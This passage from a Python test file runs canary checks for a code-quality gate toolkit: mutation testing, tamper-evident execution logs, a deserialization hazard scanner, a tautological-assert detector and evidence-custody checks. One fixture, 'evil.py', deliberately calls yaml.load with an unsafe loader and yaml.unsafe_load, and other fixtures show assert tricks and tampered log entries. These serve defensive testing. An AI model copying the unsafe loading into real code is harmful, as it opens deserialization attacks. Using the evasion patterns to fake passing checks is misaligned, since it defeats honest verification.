            "assert isinstance(soma(2, 3), int)\n", encoding="utf-8")
        strong_test = m79_dir / "test_strong.py"
        strong_test.write_text(
            "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent))\n"
            "from calc import soma\n"
            "assert soma(2, 3) == 5\n", encoding="utf-8")
        res_weak = run_mutant_hunt(calc_py, [sys.executable, str(weak_test)], max_mutants=5)
        res_strong = run_mutant_hunt(calc_py, [sys.executable, str(strong_test)], max_mutants=5)
        expect("Canário M79: mutant_hunt flagra mutante sobrevivente em teste fraco e mata 100% em teste forte preservando arquivo original",
               res_weak["survived"] > 0 and res_strong["kill_rate"] == 100.0
               and calc_py.read_text(encoding="utf-8") == "def soma(a, b):\n    return a + b\n",
               f"weak={res_weak} strong={res_strong}")

        # M80: henke_cli exec grava exec_log.jsonl hash-encadeado e verify_exec_log bloqueia adulteração de testes_descobertos
        m80_dir = t / "m80_exec"
        m80_dir.mkdir()
        CLI_SCRIPT = repo_root / "scripts" / "henke_cli.py"
        # Comando real de teste (não texto de saída — desde o endurecimento banca
        # v5, `discovered>0` sozinho NÃO classifica o comando como runner).
        # unittest precisa de ≥1 teste real — py3.12 sai exit 5 com zero testes.
        (m80_dir / "test_sample.py").write_text(
            "import unittest\n\nclass T(unittest.TestCase):\n    def test_x(self):\n        self.assertEqual(1 + 1, 2)\n",
            encoding="utf-8")
        c_ex, o_ex = run(CLI_SCRIPT, "exec", "--repo", m80_dir, "--",
                         sys.executable, "-m", "unittest", "discover", "-s", str(m80_dir))
        exec_log_p = m80_dir / ".henke" / "exec_log.jsonl"
        led_p = m80_dir / ".henke" / "LEDGER.json"
        led_entries = json.loads(led_p.read_text(encoding="utf-8")) if led_p.is_file() else []
        errs_valid_log = verify_exec_log(led_entries, exec_log_p)
        tampered_entries = [{"cmd": led_entries[0]["cmd"], "exit": 0, "testes_descobertos": 999}] if led_entries else []
        errs_tampered_log = verify_exec_log(tampered_entries, exec_log_p)
        expect("Canário M80: henke exec grava exec_log.jsonl com stdout_sha256 e verify_exec_log bloqueia contagem adulterada",
               c_ex == 0 and exec_log_p.is_file() and errs_valid_log == []
               and any("UNVERIFIED_EXECUTION_EVIDENCE" in e for e in errs_tampered_log),
               f"valid={errs_valid_log} tampered={errs_tampered_log}")

        # --- banca v6: canários de regressão dos fixes ---

        # M81: polyglot — '/' após keyword (return/typeof/etc.) é regex literal,
        # não abre comentário /*; '/' após identificador é divisão.
        from scripts.metricas import polyglot as _pg
        js_regex = "function f(){ return /a\\/*/; exec(cmd); }\n"
        masked_r = _pg.mask_c_like(js_regex, ".js")
        js_div = "function g(){ x = y / z /*comentario*/; exec(cmd2); }\n"
        masked_d = _pg.mask_c_like(js_div, ".js")
        expect("Canário M81: polyglot mascara /* dentro de regex literal mas trata divisão como comentário",
               "exec(cmd)" in masked_r and "exec(cmd2)" in masked_d,
               f"regex={masked_r!r} div={masked_d!r}")

        # M82: hazard — yaml.load exige loader seguro EXATO (AST); NotSafeLoader
        # e comentário mencionando SafeLoader não são bypass; unsafe_load sempre.
        from scripts.metricas.hazard_scan import scan_path as _hz_scan
        hz_dir = t / "m82_yaml"
        hz_dir.mkdir()
        (hz_dir / "evil.py").write_text(
            "import yaml\nyaml.load(data, Loader=NotSafeLoader)\nyaml.unsafe_load(d2)\n",
            encoding="utf-8")
        (hz_dir / "clean.py").write_text(
            "import yaml\nyaml.load(data, Loader=SafeLoader)\nyaml.safe_load(d2)\n",
            encoding="utf-8")
        _, res_e, _ = _hz_scan(hz_dir / "evil.py")
        _, res_c, _ = _hz_scan(hz_dir / "clean.py")
        ev_rules = {f[0] for f in res_e}
        cl_rules = {f[0] for f in res_c}
        expect("Canário M82: hazard reprova NotSafeLoader/unsafe_load e aprova SafeLoader",
               any("DESER" in str(r).upper() for r in ev_rules)
               and not any("DESER" in str(r).upper() for r in cl_rules),
               f"evil={ev_rules} clean={cl_rules}")

        # M83: assertless — rebind TARDIO não lava tautologia por-ponto:
        # `ok=True; assert ok; ok=f()` reprova; `ok=f(); assert ok` aprova.
        m83_dir = t / "m83_rebind"
        m83_dir.mkdir()
        (m83_dir / "test_evade.py").write_text(
            "def test_e():\n    ok = True\n    assert ok\n    ok = compute()\n",
            encoding="utf-8")
        (m83_dir / "test_legit.py").write_text(
            "def test_l():\n    ok = compute()\n    assert ok\n",
            encoding="utf-8")
        c83a, _ = run(MET / "assertless_scan.py", m83_dir / "test_evade.py")
        c83b, _ = run(MET / "assertless_scan.py", m83_dir / "test_legit.py")
        expect("Canário M83: assertless reprova tautologia com rebind tardio e aprova binding real",
               c83a == 1 and c83b == 0, f"evade={c83a} legit={c83b}")

        # M84: run_state — evidência fora de .henke/evidence/<run_id>/ é
        # EVIDENCE-OUTSIDE-SCOPE; nome de portão reservado (stage_*) sai 2 no CLI.
        m84_ev = t / "fora.out"
        m84_ev.write_text("fora do confinamento\n", encoding="utf-8")
        m84_sha = hashlib.sha256(m84_ev.read_bytes()).hexdigest()
        (t / ".henke" / "runs2").mkdir(parents=True, exist_ok=True)
        m84_run = t / ".henke" / "runs2" / "r9.json"
        m84_run.write_text(json.dumps({
            "run_id": "r9", "mode": "EXECUTAR", "archetype": "CARPINTEIRO",
            "outcome": "verified",
            "gates": {"hazard_scan": {
                "exit_code": 0, "command": "hs .",
                "evidence_file": str(m84_ev), "evidence_sha256": m84_sha,
            }}}), encoding="utf-8")
        ok84, errs84 = verify_run_file(m84_run)
        RS_SCRIPT = repo_root / "scripts" / "run_state.py"
        c84, o84 = run(RS_SCRIPT, "record-gate", str(m84_run),
                       "--gate", "stage_dispatch", "--exit-code", "0")
        # Custódia v6+v8: evidência plantada é rejeitada — ANCHOR-SIDECAR-
        # MISSING (runs2/ não-canônico não acha âncora) ou UNMANIFESTED ou
        # OUTSIDE-SCOPE — qualquer uma prova falha-fechada contra planta.
        expect("Canário M84: verify bloqueia evidência fora do confinamento e record-gate rejeita nome reservado",
               not ok84 and any("EVIDENCE-UNMANIFESTED" in e or "EVIDENCE-OUTSIDE-SCOPE" in e
                                or "ANCHOR-SIDECAR-MISSING" in e for e in errs84) and c84 == 2,
               f"verify={errs84} cli={c84}:{o84[-120:]}")

    return passed, total, reports


def main():
    print("Canários bilaterais dos portões métricos (UB-assimilados)...")
    passed, total, reports = run_all_metric_canaries()
    for r in reports:
        print(" ", r)
    print(f"\nResultado: {passed}/{total} canários aprovados "
          f"({(passed/total)*100:.1f}% de recall).")
    if passed != total:
        sys.exit(1)
    print("OK: portões métricos reprovam o ruim e aprovam o permitido.")


if __name__ == "__main__":
    main()
